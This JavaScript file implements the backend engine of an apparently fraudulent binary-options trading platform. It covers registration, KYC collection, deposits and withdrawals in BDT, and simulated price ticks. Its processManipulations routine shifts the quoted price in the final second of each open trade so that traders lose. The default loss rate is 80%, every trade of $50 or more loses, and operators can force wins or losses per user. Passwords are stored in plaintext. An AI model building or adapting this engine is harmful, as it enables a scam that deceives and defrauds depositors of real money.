class MarketEngine {
  constructor(initialPrice = 1.08500, volatility = 0.00018) {
    this.currentPrice = initialPrice;
    this.volatility = volatility;
    this.openTrades = [];
    this.tradeHistory = [];
    
    // Risk Engine Configuration
    this.globalHouseEdge = 80; // Default 80% loss probability
    this.bigBetThreshold = 50; // $50+ trades automatically loss
    this.userModes = {}; // Stores { userId: 'AUTO' | 'FORCE_WIN' | 'FORCE_LOSS' }

    this.users = {};
    this.pendingDeposits = [];
    this.pendingWithdrawals = [];
    this.approvedDeposits = [];
    this.approvedWithdrawals = [];
    this.pendingKYCs = [];
  }

  registerUser(fullName, email, password, phone) {
    if (this.users[email]) return { success: false, message: 'Email is already registered' };
    const user = { 
      id: 'USR_' + Math.floor(1000 + Math.random() * 9000), 
      fullName: fullName || 'User',
      email, 
      password, 
      phone: phone || 'N/A', 
      realBalance: 0.00, 
      demoBalance: 10000.00,
      kycStatus: 'UNVERIFIED'
    };
    this.users[email] = user;
    return { success: true, user };
  }

  loginUser(email, password) {
    const user = this.users[email];
    if (!user || user.password !== password) return { success: false, message: 'Invalid Credentials' };
    return { success: true, user };
  }

  submitKYC(userId, nidNumber, documentType) {
    const kycReq = { id: 'KYC_' + Date.now(), userId, nidNumber, documentType, timestamp: Date.now(), status: 'PENDING' };
    this.pendingKYCs.push(kycReq);
    return kycReq;
  }

  requestDeposit(userId, amount, method, trxId) {
    const depositReq = {
      id: 'DEP_' + Date.now(),
      userId,
      amount: parseFloat(amount),
      bdtAmount: (parseFloat(amount) * 122).toFixed(2),
      method,
      trxId,
      timestamp: Date.now(),
      status: 'PENDING'
    };
    this.pendingDeposits.push(depositReq);
    return depositReq;
  }

  requestWithdrawal(userId, amount, method, accountNo) {
    const withdrawalReq = {
      id: 'WITH_' + Date.now(),
      userId,
      amount: parseFloat(amount),
      bdtAmount: (parseFloat(amount) * 122).toFixed(2),
      method,
      accountNo,
      timestamp: Date.now(),
      status: 'PENDING'
    };
    this.pendingWithdrawals.push(withdrawalReq);
    return withdrawalReq;
  }

  approveTransaction(id, type) {
    if (type === 'DEPOSIT') {
      const idx = this.pendingDeposits.findIndex(d => d.id === id);
      if (idx !== -1) {
        const item = this.pendingDeposits.splice(idx, 1)[0];
        item.status = 'APPROVED';
        this.approvedDeposits.push(item);
        
        const u = Object.values(this.users).find(usr => usr.id === item.userId);
        if (u) u.realBalance += item.amount;
        return item;
      }
    } else if (type === 'WITHDRAWAL') {
      const idx = this.pendingWithdrawals.findIndex(w => w.id === id);
      if (idx !== -1) {
        const item = this.pendingWithdrawals.splice(idx, 1)[0];
        item.status = 'APPROVED';
        this.approvedWithdrawals.push(item);
        return item;
      }
    }
    return null;
  }

  rejectTransaction(id, type) {
    if (type === 'DEPOSIT') {
      this.pendingDeposits = this.pendingDeposits.filter(d => d.id !== id);
    } else if (type === 'WITHDRAWAL') {
      this.pendingWithdrawals = this.pendingWithdrawals.filter(w => w.id !== id);
    }
  }

  getStats() {
    const now = Date.now();
    const oneHourAgo = now - (3600 * 1000);
    const twentyFourHoursAgo = now - (24 * 3600 * 1000);

    const dep1h = this.approvedDeposits.filter(d => d.timestamp >= oneHourAgo).reduce((s, d) => s + d.amount, 0);
    const with1h = this.approvedWithdrawals.filter(w => w.timestamp >= oneHourAgo).reduce((s, w) => s + w.amount, 0);
    const dep24h = this.approvedDeposits.filter(d => d.timestamp >= twentyFourHoursAgo).reduce((s, d) => s + d.amount, 0);
    const with24h = this.approvedWithdrawals.filter(w => w.timestamp >= twentyFourHoursAgo).reduce((s, w) => s + w.amount, 0);

    return {
      dep1h: dep1h.toFixed(2),
      with1h: with1h.toFixed(2),
      dep24h: dep24h.toFixed(2),
      profit24h: (dep24h - with24h).toFixed(2),
      houseEdge: this.globalHouseEdge,
      bigBetThreshold: this.bigBetThreshold
    };
  }

  // Geometric Brownian Motion Algorithm Formula
  generateNextTick() {
    const dt = 0.1;
    const drift = (Math.random() - 0.499) * 0.00002;
    const randomShock = (Math.random() - 0.5) * 2;
    const change = (this.currentPrice * drift * dt) + (this.currentPrice * this.volatility * Math.sqrt(dt) * randomShock);
    
    this.currentPrice = parseFloat((this.currentPrice + change).toFixed(5));
    this.processManipulations();
    return this.currentPrice;
  }

  setUserMode(userId, mode) {
    this.userModes[userId] = mode;
  }

  addTrade(trade) {
    this.openTrades.push(trade);
  }

  // Last-Second 1-Pip Shift Manipulation Logic
  processManipulations() {
    const now = Date.now();

    this.openTrades.forEach(trade => {
      const timeRemaining = trade.expiresAt - now;

      if (timeRemaining <= 1000 && timeRemaining > 0) {
        let shouldForceLoss = false;
        const mode = this.userModes[trade.userId] || 'AUTO';

        if (mode === 'FORCE_LOSS') {
          shouldForceLoss = true;
        } else if (mode === 'FORCE_WIN') {
          shouldForceLoss = false;
        } else if (trade.amount >= this.bigBetThreshold) {
          shouldForceLoss = true;
        } else {
          const rand = Math.random() * 100;
          if (rand < this.globalHouseEdge) shouldForceLoss = true;
        }

        if (shouldForceLoss) {
          if (trade.type === 'CALL' && this.currentPrice >= trade.entryPrice) {
            this.currentPrice = parseFloat((trade.entryPrice - 0.00003).toFixed(5));
          } else if (trade.type === 'PUT' && this.currentPrice <= trade.entryPrice) {
            this.currentPrice = parseFloat((trade.entryPrice + 0.00003).toFixed(5));
          }
        } else {
          if (trade.type === 'CALL' && this.currentPrice <= trade.entryPrice) {
            this.currentPrice = parseFloat((trade.entryPrice + 0.00003).toFixed(5));
          } else if (trade.type === 'PUT' && this.currentPrice >= trade.entryPrice) {
            this.currentPrice = parseFloat((trade.entryPrice - 0.00003).toFixed(5));
          }
        }
      }
    });

    this.openTrades = this.openTrades.filter(t => t.expiresAt > now);
  }
}

module.exports = MarketEngine;
